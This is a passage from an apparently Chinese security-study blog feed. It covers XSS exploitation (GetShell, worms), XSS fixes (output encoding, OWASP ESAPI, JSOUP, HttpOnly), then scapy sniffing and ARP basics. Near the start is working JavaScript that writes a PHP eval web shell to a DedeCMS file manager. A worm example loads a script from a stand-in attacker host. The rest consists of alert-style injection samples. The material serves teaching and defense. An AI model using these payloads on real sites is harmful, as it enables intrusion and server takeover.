punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        xmlhttp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>ActiveXObject<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         xmlhttp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"Microsoft.XMLHTTP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function">startXMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token function">createXMLHTTP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">var</span> str<span class="token operator">=</span><span class="token string">"fmdo=edit&amp;backurl=&amp;activepath=/dede&amp;filename=xss.php&amp;str=&lt;?php @eval($_POST['chopper']);?>"</span><span class="token punctuation">;</span>     <span class="token comment">//str=encodeURI(str); </span>    xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"/dede/file_manage_control.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     xmlhttp<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">startXMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  将以上的javascript代码保存至文本文件中，然后将该文本文件放置到攻击者的服务器上。攻击者就可以利用目标网站存在的存储型xss漏洞向目标网站服务器中写入一段javascript代码</p></li></ul></li></ul><p>注：XSS GetShell的利用条件是苛刻的，只有开源的web应用程序才可能有XSS GetShell.在进行黑盒测试时，XSS GetShell几乎是不可能的事情</p><h3 id="XSS蠕虫（XSS-Worm）"><a href="#XSS蠕虫（XSS-Worm）" class="headerlink" title="XSS蠕虫（XSS Worm）"></a>XSS蠕虫（XSS Worm）</h3><h4 id="蠕虫病毒"><a href="#蠕虫病毒" class="headerlink" title="蠕虫病毒"></a>蠕虫病毒</h4><p>具有“传染性”的恶意软件</p><h4 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h4><p>是针对浏览器的攻击，网站规模越大，攻击效果就越大</p><h4 id="XSS蠕虫与系统病毒的区别"><a href="#XSS蠕虫与系统病毒的区别" class="headerlink" title="XSS蠕虫与系统病毒的区别"></a>XSS蠕虫与系统病毒的区别</h4><p>同样具有“传染性”，与系统病毒的唯一区别就是无法对系统底层操作，因为XSS蠕虫一般是基于javascript编写，而javascript最大的用武之地是web,但对于底层编程能力几乎为零。</p><h4 id="XSS蠕虫应用场景"><a href="#XSS蠕虫应用场景" class="headerlink" title="XSS蠕虫应用场景"></a>XSS蠕虫应用场景</h4><p>XSS蠕虫大多数出现在大用户量的网站平台，比如微博、贴吧等一些社交网站。因为只有当用户量足够多的情况下，XSS蠕虫才能发挥效果</p><h4 id="示例：微博XSS蠕虫–-gt-让更多的用户关注自己"><a href="#示例：微博XSS蠕虫–-gt-让更多的用户关注自己" class="headerlink" title="示例：微博XSS蠕虫–&gt;让更多的用户关注自己"></a>示例：微博XSS蠕虫–&gt;让更多的用户关注自己</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><ul><li>展开XSS蠕虫攻击之前，首先需要对网站的业务、功能有所了解<ul><li>分析如何让他人关注自己<br>  访问 <a href="http://www.weibo.com/listen.php?userid=888">http://www.weibo.com/listen.php?userid=888</a></li><li>分析如何让蠕虫自主传播<br>  微博发表微博处存在存储型XSS漏洞，攻击者发表一篇微博，其中存在XSS攻击代码，当有用户访问了攻击者发表的微博页面，该XSS攻击代码就会在用户的浏览器上执行。该XSS攻击代码的功能是关注攻击者并转发攻击者的微博让更多人看到。</li></ul></li><li>展开XSS蠕虫攻击<ul><li>在目标网站存在存储型XSS漏洞的地方插入XSS攻击代码</li><li>如果目标网站限制插入内容的长度，则可以通过导入外部js的方式来缩短内容<ul><li>将xss攻击代码以xss.js文件保存到攻击者服务器上</li><li>在存储型漏洞点处插入  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://hacker.com/xss.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul></li></ul><h4 id="XSS蠕虫的核心"><a href="#XSS蠕虫的核心" class="headerlink" title="XSS蠕虫的核心"></a>XSS蠕虫的核心</h4><p>能够自主传播</p><h2 id="修复XSS跨站漏洞"><a href="#修复XSS跨站漏洞" class="headerlink" title="修复XSS跨站漏洞"></a>修复XSS跨站漏洞</h2><h3 id="XSS漏洞的形成原因"><a href="#XSS漏洞的形成原因" class="headerlink" title="XSS漏洞的形成原因"></a>XSS漏洞的形成原因</h3><p>对输入与输出没有严格过滤，导致用户输入的javascript等客户端脚本在浏览器上执行</p><h3 id="修补XSS漏洞"><a href="#修补XSS漏洞" class="headerlink" title="修补XSS漏洞"></a>修补XSS漏洞</h3><p>只要将敏感字符过滤，即可修补XSS跨站漏洞</p><h4 id="XSS过滤方法"><a href="#XSS过滤方法" class="headerlink" title="XSS过滤方法"></a>XSS过滤方法</h4><h5 id="输入与输出"><a href="#输入与输出" class="headerlink" title="输入与输出"></a>输入与输出</h5><ul><li>HTML的特殊字符<br>|     |     |     |     |     |     |</li></ul><p>| — | — | — | — | — | — |<br>| 特殊字符 | &lt;   | &gt;   | ‘   | “   | &amp;   |<br>| 实体  | &amp;lt;   | &amp;gt;   | &amp;apos;   | &amp;quot;   | &amp;amp;   | </p><ul><li><p>PHP函数–&gt;把预定义的字符转换为html实体<br><code>htmlspecialchars()</code><br><code>htmlentities()</code> </p></li><li><p>JAVA第三方组件–&gt;支持过滤XSS漏洞</p><ul><li>OWASP ESAPI<ul><li>OWASP ESAPI工具包是专门用来防御安全漏洞的API,如：SQL注入、XSS、CSRF等知名漏洞</li><li>OWASP ESAPI支持JavaEE、ASP、NET、PHP、Python等语言 </li><li>XSS可能发生的场景<ul><li><p>在标签内输出</p>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>$&#123;xss&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  在标签内输出数据则无需构造标签，直接控制${xss}变量即可造成XSS漏洞,如：</p>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在属性内输出</p>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;xss&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;xss&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;xss&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  在属性内输出数据则仅仅需要闭合标签，就可以继续进行XSS操作，如:</p>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>" /><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(/xss/)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在事件中输出（与属性相同）</p>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x.jpg<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">$<span class="token punctuation">&#123;</span>xss<span class="token punctuation">&#125;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">fun</span><span class="token punctuation">(</span><span class="token string">'$&#123;xss&#125;'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  攻击的方法同样是进行闭合，如：</p>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">fun</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token special-attr"><span class="token attr-name">onkeyup</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//')</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">fun</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//')</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在CSS中输出</p>  <pre class="line-numbers language-css" data-language="css"><code class="language-css"> <span class="token selector">&lt;style>body</span> <span class="token punctuation">&#123;</span><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>$&#123;xss&#125;<span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">body</span> <span class="token punctuation">&#123;</span><span class="token selector">background-image: expression($</span><span class="token punctuation">&#123;</span>xss<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>&lt;/style><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  在CSS中输出同样存在XSS的风险,如：</p>  <pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"javascript:alert(/xss/)"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">expression</span><span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span>/xss/<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在script标签中输出</p>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">var</span> username<span class="token operator">=</span><span class="token string">"$&#123;username&#125;"</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  这里的侧重点仍然是闭合标签</p>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> username<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//";</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li>在OWASP ESAPI的“org.owasp.esapi.codecs”包中提供了一系列的编码操作，其中包括：HTML编码、Javascript编码、VBScript编码、CSS编码、SQL编码等。<ul><li>HTML编码接口<ul><li>HTML编码接口  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/1-4.png" class="">  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/2-5.png" class=""></li><li>HTML属性编码接口  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/3-3.png" class=""></li><li>注：  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/4-3.png" class=""></li></ul></li><li>CSS编码接口<br>  对输入输出的CSS编码  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/5-2.png" class="">  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/1-2.png" class=""></li><li>Javascript编码<br>  对输入输出的javascript编码  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/2-2.png" class="">  编码结果为十六进制字符串</li></ul></li></ul></li><li>JSOUP<ul><li>JAVA的HTML解析器</li><li>使用白名单（Whitelist）的过滤模式过滤html标签和属性：Whitelist中含有对应的标签及属性就说明服务器允许用户输入该标签及属性，如果Whitelist中不含有对应的标签及属性就说明服务器不允许用户输入该标签及属性<ul><li>使用Jsoup HTML Cleaner方法可以清除XSS漏洞，但需要指定一个可配置的Whitelist</li><li>示例  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/1-3.png" class="">  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/2-4.png" class=""></li></ul></li></ul></li><li>xssprotect</li></ul></li></ul><h5 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h5><p>HttpOnly对防御XSS漏洞不起作用，而主要目的是为了解决攻击者利用XSS漏洞进行的cookie劫持攻击</p><ul><li>定义：HttpOnly是微软的IE6 sp1引入的一项新特性，这个特性为cookie提供了一个新属性，用来阻止客户端脚本访问cookie。至今已成为一个标准，几乎所有的浏览器都会支持HttpOnly。</li><li>服务器向客户端发送cookie<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Set-Cookie:username=root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Set-Cookie:password=password;HttpOnly"</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>由于第2条cookie带有HttpOnly标志，所以客户端脚本就不能访问该cookie</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络嗅探与欺骗</title>
      <link href="/2021/12/16/%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E6%AC%BA%E9%AA%97/"/>
      <url>/2021/12/16/%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<h1 id="网络数据嗅探"><a href="#网络数据嗅探" class="headerlink" title="网络数据嗅探"></a>网络数据嗅探</h1><h3 id="scapy中捕获数据包的函数"><a href="#scapy中捕获数据包的函数" class="headerlink" title="scapy中捕获数据包的函数"></a>scapy中捕获数据包的函数</h3><p>sniff()</p><h3 id="sniff-中重要的参数"><a href="#sniff-中重要的参数" class="headerlink" title="sniff()中重要的参数"></a>sniff()中重要的参数</h3><p>count#表示要捕获数据包的数量。默认值为0，表示不限制数量<br>store#表示是否要保存捕获到的数据包。默认值为1<br>prn#这个参数是一个函数，这个函数将会应用在每一个捕获到的数据包上。如果这个函数有返回值，将会显示出来。默认是空<br>iface#表示要使用的网卡或网卡列表<br>filter#要应用的BPF过滤器</p><h3 id="sniff-过滤器的使用"><a href="#sniff-过滤器的使用" class="headerlink" title="sniff()过滤器的使用"></a>sniff()过滤器的使用</h3><ul><li>sniff()过滤器使用的过滤语法<br>伯克利包过滤语法（BPF）<br>BPF通过比较各个层协议中数据字段值的方法对流量进行过滤</li><li>BPF的主要特点<br>使用一个名为“原语”的方法来完成对网络数据包的描述，支持与，或，非等逻辑运算<ul><li>例<br>  host#描述主机<br>  port#描述端口</li></ul></li><li>BPF表达式<br>使用BPF语法创建出来的过滤器被称为BPF表达式<br>每个表达式包含一个或多个原语，每个原语中又包含一个或多个限定词。主要有3个限定词<ul><li>Type<br>  Type用来规定使用名字或数字代表的类型。例如：host,net,port等</li><li>Dir<br>  Dir用来规定流量的方向。例如：src,dst,src and dst等</li><li>Proto<br>  Proto用来规定匹配的协议。例如：ip,tcp,arp等</li></ul></li><li>常见的过滤器<br>host 1.1.1.1#只捕获与网络中某一个IP的主机进行交互的流量<br>ether host 00-11-22-33-44-55#只捕获与网络中某一个MAC地址的主机进行交互的流量<br>src host 1.1.1.1#只捕获来自网络中某一个IP的主机的流量<br>dst host 1.1.1.1#只捕获去往网络中某一个IP的主机的流量。host可以省略，dst 1.1.1.1<br>port 23#只捕获23端口的流量<br>!23#捕获除了23端口以外的流量<br>dst port 80#只捕获目的端口为80的流量<br>icmp#只捕获icmp流量<br>icmp[0]&#x3D;3 &amp;&amp; icmp[1]&#x3D;0#只捕获type为3，code为0的icmp流量</li></ul><h3 id="即时显示捕获的数据包"><a href="#即时显示捕获的数据包" class="headerlink" title="即时显示捕获的数据包"></a>即时显示捕获的数据包</h3><pre class="line-numbers language-none"><code class="language-none">prn&#x3D;lambda x:x.summary()#x可以为任意字符，如y,z等<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="即时显示捕获的数据包中的某项信息"><a href="#即时显示捕获的数据包中的某项信息" class="headerlink" title="即时显示捕获的数据包中的某项信息"></a>即时显示捕获的数据包中的某项信息</h3><pre class="line-numbers language-none"><code class="language-none">prn&#x3D;lambda x:x[IP].src<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="自定义函数及调用"><a href="#自定义函数及调用" class="headerlink" title="自定义函数及调用"></a>自定义函数及调用</h3><pre class="line-numbers language-none"><code class="language-none">def callback(packet):print(packet.show())#scapy中的show()表示显示数据包的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="wrpcap-将捕获的数据包保存为一个文件"><a href="#wrpcap-将捕获的数据包保存为一个文件" class="headerlink" title="wrpcap()将捕获的数据包保存为一个文件"></a>wrpcap()将捕获的数据包保存为一个文件</h3><pre class="line-numbers language-none"><code class="language-none">wrpcap(&quot;demo.pcap&quot;,packet)#demo.pcap为文件名，packet为捕获的数据包#保存的格式很多，目前最为通用的格式是pcap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="wireshark-调用wireshark来查看数据包"><a href="#wireshark-调用wireshark来查看数据包" class="headerlink" title="wireshark()调用wireshark来查看数据包"></a>wireshark()调用wireshark来查看数据包</h3><pre class="line-numbers language-none"><code class="language-none">wireshark(packet)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h1><h3 id="arp的原理与缺陷"><a href="#arp的原理与缺陷" class="headerlink" title="arp的原理与缺陷"></a>arp的原理与缺陷</h3><p>目前网络中大部分的监听和欺骗技术都是源于arp协议</p><ul><li>arp原理<br>以太网中使用的设备交换机并不能识别IP地址，只能识别硬件地址。在交换机中使用一个内容寻址寄存器（CAM），这个CAM表列出了交换机每一个端口所连接设备的硬件地址<ul><li>CAM表  <pre class="line-numbers language-none"><code class="language-none">Mac AddressPorts11:11:11:11:11:11Fa0&#x2F;122:22:22:22:22:22Fa0&#x2F;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>当交换机收到了一个发往特定硬件地址的数据包（例如：11:11:11:11:11:11），就会首先查找CAM表中是否有对应的表项，如果有就将数据包发往这个端口（例如：Fa0&#x2F;1）<br>因为软件中使用的都是IP地址，而交换机使用的却是硬件地址，那么这个过程中一定发生了IP地址和硬件地址的转换，这个转换发生在软件将数据包交给交换机之前。在每一台支持arp的主机中都有一个arp表，arp表保存了已知的IP地址和硬件地址的对应关系</li><li>ARP表  <pre class="line-numbers language-none"><code class="language-none">IP地址硬件地址类型1.1.1.111:11:11:11:11:11动态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>查看windows系统arp表  <pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看linux系统arp表  <pre class="line-numbers language-none"><code class="language-none">arp<span aria-hidden="true" 